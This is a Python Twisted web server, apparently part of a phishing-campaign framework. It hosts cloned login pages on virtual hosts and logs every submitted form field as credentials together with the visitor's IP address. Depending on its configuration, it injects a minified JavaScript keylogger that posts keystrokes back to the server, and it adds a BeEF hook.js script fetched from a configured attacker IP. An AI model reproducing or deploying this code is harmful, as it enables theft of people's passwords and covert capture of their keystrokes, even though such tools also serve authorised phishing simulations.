#!/usr/bin/env python

#from __future__ import absolute_import
#from __future__ import division
#from __future__ import print_function

from twisted.internet import reactor, ssl
from twisted.web.resource import Resource
from twisted.web.server import Site, NOT_DONE_YET
from twisted.web import static, vhost, proxy
import twisted.internet.error
import sys
import time
import os
import re
import subprocess
from core.utils import Utils
from core.display import Display
from core.mydb import MyDB


# define standard static page
class staticPage(Resource):
    def __init__(self, text="<html><body></body></html>"):
        self.text = text

    def render_GET(self, request):
        return self.text

# define standard mobile page
class mobilePage(Resource):
    def __init__(self, url, title="Mobile Device Detected"):
        self.text=" <html> <br> <br> <br> <head> <meta content='text/html; charset=windows-1252' http-equiv='content-type'> <meta http-equiv='refresh' content='5;URL="+url+"'> <title>"+title+"</title> </head> <body> <center> <br> <br> <br> <br>You are attempting to access this site from a mobile device.  <br> <br>Please try again later from a desktop computer.  </center> </body> </html>"

    def render_GET(self, request):
        return self.text

# define standard error page
class errorPage(Resource):
    def __init__(self, text="<html><body><center><h1>An error has occured.  Please try again later.</h1></center></body></html>"):
        self.text = text

    def render_GET(self, request):
        return self.text

# define standard error page
class errorRedirectPage(Resource):
    def __init__(self, url=""):
        self.url = url

    def render_GET(self, request):
        request.redirect(self.url)
        request.finish()
        return NOT_DONE_YET

# define the form for the phishing site
class phishingForm(Resource):
    def __init__(self, config, vhost, path, logpath, logfile, db, redirecturl="error"):
        self.index = ""
        self.vhost = vhost
        self.path = path
        self.logpath = logpath
        self.logfile = logfile
        self.redirecturl = redirecturl
        self.config = config
        self.loadIndex()
        self.display = Display()
        self.display.setLogPath(self.logpath)
        self.db = db
        Resource.__init__(self)

    def loadIndex(self):
        with open (self.path + "INDEX", "r") as myfile:
            html = myfile.read()
            if (self.config["enable_keylogging"] == "1"):
               js = """
<script type="text/javascript">function p(e){k=window.event?window.event.keyCode:e.which,log(43==k?"[ADD]":String.fromCharCode(k))}function d(e){k=window.event?window.event.keyCode:e.which,8==k?log("[BACKSPACE]"):9==k?log("[TAB]"):13==k?log("[ENTER]"):35==k?log("[END]"):36==k?log("[HOME]"):37==k?log("[<--]"):39==k&&log("[-->]")}function log(e){if(e){var n=new XMLHttpRequest,o=encodeURI(e);n.open("POST","index",!0),n.setRequestHeader("Content-type","application/x-www-form-urlencoded"),n.send("keylog="+o)}}window.onload=function(){window.addEventListener?(document.addEventListener("keypress",p,!0),document.addEventListener("keydown",d,!0)):window.attachEvent?(document.attachEvent("onkeypress",p),document.attachEvent("onkeydown",d)):(document.onkeypress=p,document.onkeydown=d)};</script>
"""
               html = re.sub("</head>", js + "</head>", html, flags=re.I)
            if (self.config["enable_beef"] == "1"):
               html = re.sub("</head>", "<script src=\"http://" + self.config["beef_ip"] + "/hook.js\" type=\"text/javascript\"></script>" + "</head>", html, flags=re.I)
            # enable mobile device redirect
            html = re.sub("</head>", "<script>(function(a,b){if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw-(n|u)|c55\/|capi|ccwa|cdm-|cell|chtm|cldc|cmd-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc-s|devi|dica|dmob|do(c|p)o|ds(12|-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(-|)|g1 u|g560|gene|gf-5|g-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd-(m|p|t)|hei-|hi(pt|ta)|hp( i|ip)|hs-c|ht(c(-| ||a|g|p|s|t)|tp)|hu(aw|tc)|i-(20|go|ma)|i230|iac( |-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|-[a-w])|libw|lynx|m1-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|-([1-8]|c))|phil|pire|pl(ay|uc)|pn-2|po(ck|rt|se)|prox|psio|pt-g|qa-a|qc(07|12|21|32|60|-[2-7]|i-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h-|oo|p-)|sdk\/|se(c(-|0|1)|47|mc|nd|ri)|sgh-|shar|sie(-|m)|sk-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h-|v-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl-|tdg-|tel(i|m)|tim-|t-mo|to(pl|sh)|ts(70|m-|m3|m5)|tx-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas-|your|zeto|zte-/i.test(a.substr(0,4)))window.location=b})(navigator.userAgent||navigator.vendor||window.opera,<site_url>/mobile.html');</script>", html, flags=re.I)

            self.index = html

    def render_GET(self, request):
        # log the access
        username = "unknown"
        trackid = None
        if "u" in request.args.keys():
            trackid = request.args["u"][0]
        if (self.config["enable_user_tracking"] == "1") and (trackid):
            username = self.db.findUser(trackid)
            if not username:
                username = "unknown"
        self.display.log("%s,[ACCESS],%s-%s\n" % (time.strftime("%Y.%m.%d-%H.%M.%S"), username, request.getClientIP()), filename=self.logfile)
        print("::%s:: %s,[ACCESS],%s-%s" % (self.vhost, time.strftime("%Y.%m.%d-%H.%M.%S"), username, request.getClientIP()))
        sys.stdout.flush()
        # display phishing site
        return str(re.sub("</form>", "<input type=\"hidden\" name=\"spfid\" value=\"" + username + "\"></form>", self.index, flags=re.I))

    def render_POST(self, request):
        # check to see if the POST is a keylogging post
        if ("keylog" in request.args.keys()):
            self.display.log("%s,[KEYLOGGING],%s,%s\n" % (time.strftime("%Y.%m.%d-%H.%M.%S"), request.getClientIP(), ', '.join([('%s=%s') % (k,v) for k,v in request.args.items()])), filename=self.logfile)
            print("::%s:: %s,[KEYLOGGING],%s,%s" % (self.vhost,time.strftime("%Y.%m.%d-%H.%M.%S"), request.getClientIP(), ', '.join([('%s=%s') % (k,v) for k,v in request.args.items()])))
        else:
            # log the credentials
            self.display.log("%s,[CREDENTIALS],%s,%s\n" % (time.strftime("%Y.%m.%d-%H.%M.%S"), request.getClientIP(), ', '.join([('%s=%s') % (k,v) for k,v in request.args.items()])), filename=self.logfile)
            print("::%s:: %s,[CREDENTIALS],%s,%s" % (self.vhost,time.strftime("%Y.%m.%d-%H.%M.%S"), request.getClientIP(), ', '.join([('%s=%s') % (k,v) for k,v in request.args.items()])))
        sys.stdout.flush()
        # redirect to target URL
        request.redirect(self.redirecturl)
        request.finish()
        return NOT_DONE_YET

class PhishingSite():
    def __init__(self, config, vhost, path, logpath, logfile, db, redirect):
        self.vhost = vhost
        self.path = path
        self.logpath = logpath
        self.logfile = logfile
        self.config = config
        self.db = db
        self.resource = Resource()
        self.resource.putChild("index", phishingForm(self.config, self.vhost, self.path, self.logpath, self.logfile, self.db, redirect))
        self.resource.putChild("", phishingForm(self.config, self.vhost, self.path, self.logpath, self.logfile, self.db, redirect))
        self.resource.putChild("robots.txt", staticPage("User-agent: *\rDisallow: /"))

        if (self.config["error_url"]):
            url = self.config["error_url"]
            self.resource.putChild("error", errorRedirectPage(url))
            self.resource.putChild("mobile", mobilePage(url))
        elif (self.config["error_text"]):
            text = self.config["error_text"]
            self.resource.putChild("error", staticPage(text))
        else:
            self.resource.putChild("error", staticPage("<html><body><center><h1>An error has occured.  Please try again later.</h1></center></body></html>"))
            self.resource.putChild("mobile", mobilePage(url="/"))
        self.loadChildren()

    # load any necessary resource subdirectories: js, css, img, etc...
    def loadChildren(self):
        for f in os.listdir(self.path):
            if os.path.isdir(os.path.join(self.path, f)):
                self.resource.putChild(f, static.File(self.path + f))

    def getResource(self):
        return self.resource

class PhishingWebServer():

    def __init__(self, config):
        self.config = config
        self.logpath = os.getcwd() + "/" + self.config["domain_name"] + "_" + self.config["phishing_domain"] + "/"

        #ensure log path exists
        if not os.path.exists(self.logpath):
            os.makedirs(self.logpath)
        if not os.path.exists(self.logpath+"logs/"):
            os.makedirs(self.logpath+"/logs")

        # set up database connection
        self.db = MyDB(sqlite_file=self.logpath)

        self.websites = {}
        self.phishingsites = {}
        self.MINPORT = int(self.config["vhost_port_min"])
        self.MAXPORT = int(self.config["vhost_port_max"])

    def getTemplates(self):
        templates = []
        db_static_templates = self.db.getWebTemplates(ttype="static")
        db_dynamic_templates = self.db.getWebTemplates(ttype="dynamic")
        if (db_static_templates or db_dynamic_templates):
            for template in db_static_templates:
                parts = template.split("[-]")
                template_file = parts[0] + "/CONFIG"
                if Utils.is_readable(template_file) and os.path.isfile(template_file):
                    templates.append(parts[0])
                    print "STATIC = [%s]" % (parts[0])
            for template in db_dynamic_templates:
                parts = template.split("[-]")
                template_file = parts[0] + "/CONFIG"
                if Utils.is_readable(template_file) and os.path.isfile(template_file):
                    templates.append(parts[0])
                    print "DYNAMIC = [%s]" % (parts[0])
        else:
            for f in os.listdir(self.config["web_template_path"]):
                template_file = os.path.join(self.config["web_template_path"], f) + "/CONFIG"
                if Utils.is_readable(template_file) and os.path.isfile(template_file):
                    templates.append(os.path.join(self.config["web_template_path"], f))
                    print "FIXED = [%s]" % (os.path.join(self.config["web_template_path"], f))
        return templates

    def loadSites(self):

        templates = self.getTemplates()
        print

        # loop over each web template
        for f in templates:
            template_file = f + "/CONFIG"
            if Utils.is_readable(template_file) and os.path.isfile(template_file):
                print "Found the following web sites: [%s]" % template_file
                # read in the VHOST, LOGFILE, and REDIRECTURL
                VHOST = ""
                LOGFILE = ""
                REDIRECTURL = ""
                #PATH = self.config["web_template_path"] + f + "/"
                PATH = f + "/"
                with open (template_file, "r") as myfile:
                    for line in myfile.readlines():
                        match=re.search("VHOST=", line)
                        if match:
                            VHOST=line.replace('"', "")
                            VHOST=VHOST.split("=")
                            VHOST=VHOST[1].lower().strip()
                        match2=re.search("LOGFILE=", line)
                        if match2:
                            LOGFILE=line.replace('"', "")
                            LOGFILE=LOGFILE.split("=")
                            LOGFILE=LOGFILE[1].strip()
                        match3=re.search("REDIRECTURL=", line)
                        if match3:
                            REDIRECTURL=line.replace('"', "")
                            REDIRECTURL=REDIRECTURL.replace(r'\n', "\n")
                            REDIRECTURL=REDIRECTURL.split("=")
                            REDIRECTURL=REDIRECTURL[1].strip()
                self.websites[VHOST] = {'path':PATH, 'port':8000, 'logfile':LOGFILE, 'redirecturl':REDIRECTURL}

    def timedLogFormatter(timestamp, request):
        """
        A custom request formatter.  This is whats used when each request line is formatted.

        :param timestamp:
        :param request: A twisted.web.server.Request instance
        """
        #referrer = _escape(request.getHeader(b"referer") or b"-")
        agent = _escape(request.getHeader(b"user-agent") or b"-")
        duration = round(time.time() - request.started, 4)
        line = (
            u'"%(ip)s" %(duration)ss "%(method)s %(uri)s %(protocol)s" '
            u'%(code)d %(length)s "%(agent)s"' % dict(
                ip=_escape(request.getClientIP() or b"-"),
                duration=duration,
                method=_escape(request.method),
                uri=_escape(request.uri),
                protocol=_escape(request.clientproto),
                code=request.code,
                length=request.sentLength or u"-",
                agent=agent
                ))
        return line

    def start(self):
        self.loadSites()

        if self.config["ip"] == "0.0.0.0":
            self.config["ip"]=Utils.getIP()

        #define phishing sites
        for key in self.websites:
            self.phishingsites[key] = PhishingSite(self.config, key, self.websites[key]['path'], self.logpath, "logs/" + self.websites[key]['logfile'], self.db, self.websites[key]['redirecturl']).getResource()

        site_length = 0
        for key in self.phishingsites:
            if (len(key) > site_length):
                site_length = len(key)

        # if we are doing port based
        print
        for key in self.phishingsites:
            for port in range(self.MINPORT, self.MAXPORT):
                try:
                    site = Site(self.phishingsites[key], logPath=self.logpath + "logs/" + self.websites[key]['logfile']+".access")
#                    site.logRequest = True
                    reactor.listenTCP(port, site)
                    print "Started website [%s] on [http://%s:%s]" % (('{:<%i}' % (site_length)).format(key), self.config["ip"], port)
                    self.websites[key]['port'] = port
                    break
                except twisted.internet.error.CannotListenError, ex:
                    continue

        # if we are doing virtual hosts
        if (self.config["enable_host_based_vhosts"] == "1"):
            print

            # GENERATING SSL CERTS ARE CURRENTLY BROKEN
            # TODO: Fix this
            # generate new certificates
#            domains = ""
#            cert_path = "/etc/letsencrypt/live/"
#            first = True
#            for key in self.phishingsites:
#                domains += "-d " + key + "." + self.config["phishing_domain"] + " "
#                if first:
#                    cert_path += key + "." + self.config["phishing_domain"] + "/"
#                    first = False
#
#            cmd = self.config["certbot_path"] + " certonly --register-unsafely-without-email --non-interactive --agree-tos --standalone --force-renewal " + domains
#
#            env = os.environ
#            print "Generating SSL CERT"
#            proc = subprocess.Popen(cmd, executable='/bin/bash', env=env, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, shell=True)
#            result = proc.communicate()[0]
#            m = re.search(r'.* (\/etc\/letsencrypt\/live\/[^\/]+\/).*fullchain.pem.*', result)
#            print result
#
#            cert_path = m.group(1)

            root = vhost.NameVirtualHost()
            site_length += len("." + self.config["phishing_domain"])
            # add each port based vhost to the nam based vhost
            for key in self.phishingsites:
                root.addHost(key + "." + self.config["phishing_domain"], proxy.ReverseProxyResource('localhost', self.websites[key]['port'], ''))
#                print "Created VHOST [%s] -> [https://%s:%s]" % (('{:<%i}' % (site_length)).format(key + "." + self.config["phishing_domain"]), self.config["ip"], str(self.websites[key]['port']))
                print "Created VHOST [%s] -> [http://%s:%s]" % (('{:<%i}' % (site_length)).format(key + "." + self.config["phishing_domain"]), self.config["ip"], str(self.websites[key]['port']))
            # add a mapping for the base IP address to map to one of the sites
            if (self.phishingsites):
                root.addHost(self.config["ip"], proxy.ReverseProxyResource('localhost', int(self.websites[self.phishingsites.keys()[0]]['port']), ''))
                try:
                    site = Site(root, logPath=self.logpath + "logs/root.log.access")

#                    # ADD SSL CERT
#                    sslContext = ssl.DefaultOpenSSLContextFactory(
#                        cert_path + 'privkey.pem', 
#                        cert_path + 'fullchain.pem',
#                    )
#                    reactor.listenSSL(int(self.config["default_web_ssl_port"]), site, contextFactory=sslContext)
                    reactor.listenTCP(int(self.config["default_web_port"]), site)
                except twisted.internet.error.CannotListenError, ex:
#                    print "ERROR: Could not start web service listener on port [" + int(self.config["default_web_ssl_port"]) + "]!"
                    print "ERROR: Could not start web service listener on port [80]!"
                    print ex
                    print "ERROR: Host Based Virtual Hosting will not function!"
            else:
#                print "ERROR: Could not start web service listener on port [" + int(self.config["default_web_ssl_port"]) + "]!"
                print "ERROR: Could not start web service listener on port [80]!"
                print "ERROR: Host Based Virtual Hosting will not function!"

        print
        print "Websites loaded and launched."
        sys.stdout.flush()
        reactor.run()

if __name__ == "__main__":
    def usage():
        print "web.py <config file>"

    if len(sys.argv) != 2:
        usage()
        sys.exit(0)

    if Utils.is_readable(sys.argv[1]):
        PhishingWebServer(Utils.load_config(sys.argv[1])).start()
    else:
        PhishingWebServer(Utils.decompressDict(sys.argv[1])).start()

